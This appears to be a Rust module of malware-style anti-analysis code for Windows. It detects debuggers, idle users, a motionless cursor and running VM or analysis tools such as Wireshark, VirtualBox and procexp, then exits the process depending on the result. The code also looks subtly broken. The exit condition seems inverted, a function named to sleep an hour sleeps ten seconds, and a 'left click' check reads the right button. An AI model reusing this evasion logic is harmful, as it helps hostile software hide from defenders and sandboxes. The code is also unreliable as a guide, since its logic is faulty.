#[cfg(windows)]
extern crate winapi;

use std::ptr::null_mut;
use std::vec::Vec;
use winapi::shared::minwindef::HMODULE;
use winapi::shared::windef::POINT;
use winapi::um::debugapi::IsDebuggerPresent;
use winapi::um::handleapi::CloseHandle;
use winapi::um::processthreadsapi::OpenProcess;
use winapi::um::psapi::{EnumProcessModules, EnumProcesses, GetModuleBaseNameW};
use winapi::um::synchapi::Sleep;
use winapi::um::sysinfoapi::GetTickCount;
use winapi::um::winnt::{HANDLE, PROCESS_QUERY_INFORMATION, PROCESS_VM_READ};
use winapi::um::winuser::{GetAsyncKeyState, GetCursorPos, GetLastInputInfo, LASTINPUTINFO, VK_RBUTTON};

pub fn anti_reversing() {
    if !is_debugger_present() && !is_idle() && !is_cursor_idle() && !check_process() {
        std::process::exit(0);
    }
}

pub fn is_debugger_present() -> bool {
    unsafe {
        match IsDebuggerPresent() {
            0 => false,
            _ => true,
        }
    }
}

pub fn is_idle() -> bool {
    unsafe {
        let mut last_input_info: LASTINPUTINFO = LASTINPUTINFO {
            cbSize: std::mem::size_of::<LASTINPUTINFO>() as u32,
            dwTime: 0u32,
        };
        GetLastInputInfo(&mut last_input_info);
        let idle_time: u32 = (GetTickCount() - last_input_info.dwTime) / 1000;
        idle_time >= 60
    }
}

pub fn sleep_for_an_hour() {
    unsafe { Sleep(10000) }
}

pub fn check_mouse_click(min_clicks: u32) {
    let mut count: u32 = 0;

    while count < min_clicks {
        let key_left_clicked = unsafe { GetAsyncKeyState(VK_RBUTTON) };
        if key_left_clicked >> 15 == -1 {
            count += 1;
        }
        unsafe { Sleep(100) };
    }
}

pub fn is_cursor_idle() -> bool {
    let mut cursor: POINT = POINT { x: 0i32, y: 0i32 };
    unsafe {
        GetCursorPos(&mut cursor);
        let initial_x = cursor.x;
        let initial_y = cursor.y;
        Sleep(5000);
        GetCursorPos(&mut cursor);

        return initial_x == cursor.x && initial_y == cursor.y
    }
}

pub fn print_process_name_and_id(process_id: u32) -> String {
    unsafe {
        let mut process_name: String = String::new();
        let h_process: HANDLE =
            OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, 0, process_id);
        if h_process != null_mut() {
            let mut h_mod: HMODULE = null_mut();
            let mut cb_needed: u32 = 0u32;
            if EnumProcessModules(
                h_process,
                &mut h_mod,
                std::mem::size_of::<HMODULE>() as u32,
                &mut cb_needed as *mut _ as *mut u32,
            ) == 0
            {
                return String::new();
            }
            let mut sz_process_name: Vec<u16> = Vec::with_capacity(20);
            for _ in 0..20 {
                sz_process_name.push(0u16);
            }
            GetModuleBaseNameW(h_process, h_mod, sz_process_name.as_ptr() as *mut u16, 20);

            let mut count = 0;
            while sz_process_name[count as usize] != 0 {
                count += 1;
            }
            process_name = String::from_utf16_lossy(&sz_process_name[..count as usize]);
        }
        CloseHandle(h_process);
        return process_name
    }
}

pub fn check_process() -> bool {
    let mut process_ids: Vec<u32> = Vec::with_capacity(1024);
    for _ in 0..1024 {
        process_ids.push(0u32);
    }
    let mut bytes_needed: u32 = 0u32;
    let mut count_processes: u32 = 0u32;
    if unsafe { EnumProcesses(process_ids.as_mut_ptr(), (1024 * 4) as u32, &mut bytes_needed) } == 0 {
        return false;
    }

    count_processes = bytes_needed / 4;
    let mut current_processes: Vec<String> = Vec::new();
    for count in 0..count_processes {
        if process_ids[count as usize] != 0 {
            let process_name = print_process_name_and_id(process_ids[count as usize]);
            if !process_name.is_empty() {
                current_processes.push(process_name);
            }
        }
    }

    let sandbox_processes = [
        "vmsrvc.exe",
        "tcpview.exe",
        "wireshark.exe",
        "fiddler.exe",
        "vmware.exe",
        "VirtualBox.exe",
        "procexp.exe",
        "autoit.exe",
        "vboxtray.exe",
        "vmtoolsd.exe",
        "vmrawdsk.sys.",
        "vmusbmouse.sys.",
        "df5serv.exe",
        "vboxservice.exe",
    ]
    .iter()
    .map(|s| s.to_lowercase())
    .collect::<Vec<String>>();

    let mut found_processes: Vec<&str> = Vec::new();
    for process in &current_processes {
        for sandbox_process in &sandbox_processes {
            if process.to_lowercase() == *sandbox_process {
                found_processes.push(sandbox_process);
            }
        }
    }
    return !found_processes.is_empty()
}

